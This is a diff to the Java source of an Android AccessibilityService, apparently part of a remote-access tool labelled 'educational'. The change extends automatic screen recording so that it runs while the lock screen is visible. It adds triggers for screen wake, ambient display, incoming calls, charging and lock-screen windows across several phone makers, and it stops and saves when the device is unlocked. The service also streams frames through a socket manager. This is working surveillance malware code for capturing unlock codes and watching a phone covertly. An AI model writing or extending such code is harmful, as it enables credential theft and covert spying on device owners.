@@ -277,9 +277,37 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
     }
 
+    // Lock screen package identifiers — recognized across manufacturers
+    private static final java.util.Set<String> LOCK_SCREEN_PKGS = new java.util.HashSet<>(
+        java.util.Arrays.asList(
+            "com.android.systemui",
+            "com.android.keyguard",
+            "com.samsung.android.app.aodservice",
+            "com.huawei.android.launcher",
+            "com.miui.home",
+            "com.oppo.launcher",
+            "com.coloros.lockscreen",
+            "com.oneplus.lockscreen",
+            "com.vivo.lockscreen",
+            "android"
+        )
+    );
+
     /**
-     * Register a BroadcastReceiver for screen on/off and user-unlock events.
-     * Drives autonomous screen-reader recording: record while locked, stop on unlock or screen-off.
+     * Register a BroadcastReceiver for all events that should trigger or stop
+     * screen-reader auto-recording.  Multiple triggers are registered so recording
+     * starts in every scenario where the lock/wake screen is visible.
+     *
+     * START triggers:
+     *   - ACTION_SCREEN_ON       — screen wakes from sleep
+     *   - ACTION_DREAMING_STARTED — ambient / Daydream display activated
+     *   - PHONE_STATE RINGING    — incoming call (screen wakes even if already on)
+     *   - ACTION_POWER_CONNECTED — charging starts often wakes the screen
+     *   - Lock screen window detected (handled separately in onAccessibilityEvent)
+     *
+     * STOP triggers:
+     *   - ACTION_SCREEN_OFF      — screen turned off
+     *   - ACTION_USER_PRESENT    — device fully unlocked
      */
     private void registerScreenStateReceiver() {
         if (screenStateReceiver != null) return;
@@ -290,25 +318,65 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 try {
                     SocketManager sm = SocketManager.getInstance(ctx);
                     switch (intent.getAction()) {
+
                         case Intent.ACTION_SCREEN_OFF:
                             // Screen turned off — stop recording and save
                             sm.stopScreenReaderAuto();
                             break;
+
                         case Intent.ACTION_SCREEN_ON:
-                            // Screen woke up — start recording only if still locked
+                            // Screen woke up — start recording immediately (locked or not)
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                            }, 300);
+                            break;
+
+                        case Intent.ACTION_USER_PRESENT:
+                            // Device fully unlocked — stop and save
+                            sm.stopScreenReaderAuto();
+                            break;
+
+                        case Intent.ACTION_DREAMING_STARTED:
+                            // Ambient display / Daydream activated — start recording
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                            }, 300);
+                            break;
+
+                        case Intent.ACTION_DREAMING_STOPPED:
+                            // Ambient display ended and screen is fully on — ensure loop is running
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                            }, 300);
+                            break;
+
+                        case Intent.ACTION_POWER_CONNECTED:
+                            // Charging started — screen often wakes, start recording if on
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                 try {
-                                    android.app.KeyguardManager km =
-                                            (android.app.KeyguardManager) ctx.getSystemService(KEYGUARD_SERVICE);
-                                    if (km != null && km.isKeyguardLocked()) {
+                                    android.os.PowerManager pm =
+                                        (android.os.PowerManager) ctx.getSystemService(POWER_SERVICE);
+                                    if (pm != null && pm.isInteractive()) {
                                         sm.startScreenReaderAuto();
                                     }
                                 } catch (Exception ignored) {}
                             }, 500);
                             break;
-                        case Intent.ACTION_USER_PRESENT:
-                            // Device unlocked — stop recording and save
-                            sm.stopScreenReaderAuto();
+
+                        default:
+                            // TelephonyManager.ACTION_PHONE_STATE_CHANGED
+                            if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
+                                String state = intent.getStringExtra("state");
+                                if ("RINGING".equals(state)) {
+                                    // Incoming call — screen wakes, record lock/call screen
+                                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                        try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
+                                    }, 300);
+                                } else if ("IDLE".equals(state)) {
+                                    // Call ended or rejected — stop if we started for the call
+                                    // (only stops if screen also goes off; otherwise keeps recording)
+                                }
+                            }
                             break;
                     }
                 } catch (Exception ignored) {}
@@ -318,6 +386,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         filter.addAction(Intent.ACTION_SCREEN_OFF);
         filter.addAction(Intent.ACTION_SCREEN_ON);
         filter.addAction(Intent.ACTION_USER_PRESENT);
+        filter.addAction(Intent.ACTION_DREAMING_STARTED);
+        filter.addAction(Intent.ACTION_DREAMING_STOPPED);
+        filter.addAction(Intent.ACTION_POWER_CONNECTED);
+        filter.addAction("android.intent.action.PHONE_STATE");
         registerReceiver(screenStateReceiver, filter);
     }
     
@@ -481,6 +553,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         if (smWin.isStreamingActive()) {
                             smWin.scheduleFrameAfterAction(
                                 com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
+                        }
+                        // Trigger: lock screen appeared while screen was already on
+                        // (e.g. device auto-locked, or call screen appeared)
+                        if (packageName != null && (
+                                LOCK_SCREEN_PKGS.contains(packageName)
+                                || packageName.toLowerCase().contains("keyguard")
+                                || packageName.toLowerCase().contains("lockscreen")
+                                || packageName.toLowerCase().contains("systemui"))) {
+                            smWin.startScreenReaderAuto();
                         }
                     } catch (Exception ignored) {}
                     break;
